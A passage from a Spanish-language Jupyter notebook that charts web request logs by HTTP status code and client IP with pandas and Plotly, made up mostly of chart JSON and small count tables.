      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "alignmentgroup": "True",
         "hovertemplate": "Status Code=%{marker.color}<br>count=%{y}<br>text=%{text}<extra></extra>",
         "legendgroup": "",
         "marker": {
          "color": [
           303,
           200,
           500,
           302,
           404,
           405,
           403
          ],
          "coloraxis": "coloraxis",
          "pattern": {
           "shape": ""
          }
         },
         "name": "",
         "offsetgroup": "",
         "orientation": "v",
         "showlegend": false,
         "text": [
          "60.06%",
          "27.79%",
          "8.3%",
          "2.79%",
          "0.9%",
          "0.12%",
          "0.04%"
         ],
         "textposition": "auto",
         "type": "bar",
         "x": [
          303,
          200,
          500,
          302,
          404,
          405,
          403
         ],
         "xaxis": "x",
         "y": [
          3011,
          1393,
          416,
          140,
          45,
          6,
          2
         ],
         "yaxis": "y"
        }
       ],
       "layout": {
        "barmode": "relative",
        "coloraxis": {
         "colorbar": {
          "title": {
           "text": "Status Code"
          }
         },
         "colorscale": [
          [
           0,
           "#0d0887"
          ],
          [
           0.1111111111111111,
           "#46039f"
          ],
          [
           0.2222222222222222,
           "#7201a8"
          ],
          [
           0.3333333333333333,
           "#9c179e"
          ],
          [
           0.4444444444444444,
           "#bd3786"
          ],
          [
           0.5555555555555556,
           "#d8576b"
          ],
          [
           0.6666666666666666,
           "#ed7953"
          ],
          [
           0.7777777777777778,
           "#fb9f3a"
          ],
          [
           0.8888888888888888,
           "#fdca26"
          ],
          [
           1,
           "#f0f921"
          ]
         ]
        },
        "legend": {
         "tracegroupgap": 0
        },
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Distribución de los Status Code de los envios"
        },
        "xaxis": {
         "anchor": "y",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "Status Code"
         }
        },
        "yaxis": {
         "anchor": "x",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "count"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "total_envios = envios_status['count'].sum()\n",
    "\n",
    "# Calcular el porcentaje de cada barra con dos decimales\n",
    "envios_status['porcentaje'] = (envios_status['count'] / total_envios * 100).round(2)\n",
    "\n",
    "# Crear el gráfico de barras\n",
    "fig = px.bar(envios_status, x='Status Code', y='count', title='Distribución de los Status Code de los envios',\n",
    "             text=envios_status['porcentaje'].astype(str) + '%')  # Mostrar el porcentaje de cada barra con dos decimales como texto\n",
    "\n",
    "# Mostrar el gráfico\n",
    "fig.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>200</td>\n",
       "      <td>198</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>302</td>\n",
       "      <td>122</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>405</td>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>303</td>\n",
       "      <td>3011</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>200</td>\n",
       "      <td>1195</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>500</td>\n",
       "      <td>416</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>404</td>\n",
       "      <td>45</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>302</td>\n",
       "      <td>18</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>403</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       Client IP  Status Code  count\n",
       "0  192.168.4.164          200    198\n",
       "1  192.168.4.164          302    122\n",
       "2  192.168.4.164          405      6\n",
       "3   192.168.4.25          303   3011\n",
       "4   192.168.4.25          200   1195\n",
       "5   192.168.4.25          500    416\n",
       "6   192.168.4.25          404     45\n",
       "7   192.168.4.25          302     18\n",
       "8   192.168.4.25          403      2"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "envios_status = envios.groupby('Client IP')['Status Code'].value_counts().reset_index()\n",
    "envios_status"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "alignmentgroup": "True",
         "hovertemplate": "Client IP=192.168.4.164<br>Status Code=%{x}<br>count=%{y}<br>text=%{text}<extra></extra>",
         "legendgroup": "192.168.4.164",
         "marker": {
          "color": "#636efa",
          "pattern": {
           "shape": ""
          }
         },
         "name": "192.168.4.164",
         "offsetgroup": "192.168.4.164",
         "orientation": "v",
         "showlegend": true,
         "text": [
          "3.95%",
          "2.43%",
          "0.12%"
         ],
         "textposition": "auto",
         "type": "bar",
         "x": [
          200,
          302,
          405
         ],
         "xaxis": "x",
         "y": [
          198,
          122,
          6
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Client IP=192.168.4.25<br>Status Code=%{x}<br>count=%{y}<br>text=%{text}<extra></extra>",
         "legendgroup": "192.168.4.25",
         "marker": {
          "color": "#EF553B",
          "pattern": {
           "shape": ""
          }
         },
         "name": "192.168.4.25",
         "offsetgroup": "192.168.4.25",
         "orientation": "v",
         "showlegend": true,
         "text": [
          "60.06%",
          "23.84%",
          "8.3%",
          "0.9%",
          "0.36%",
          "0.04%"
         ],
         "textposition": "auto",
         "type": "bar",
         "x": [
          303,
          200,
          500,
          404,
          302,
          403
         ],
         "xaxis": "x",
         "y": [
          3011,
          1195,
          416,
          45,
          18,
          2
         ],
         "yaxis": "y"
        }
       ],
       "layout": {
        "barmode": "relative",
        "legend": {
         "title": {
          "text": "Client IP"
         },
         "tracegroupgap": 0
        },
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
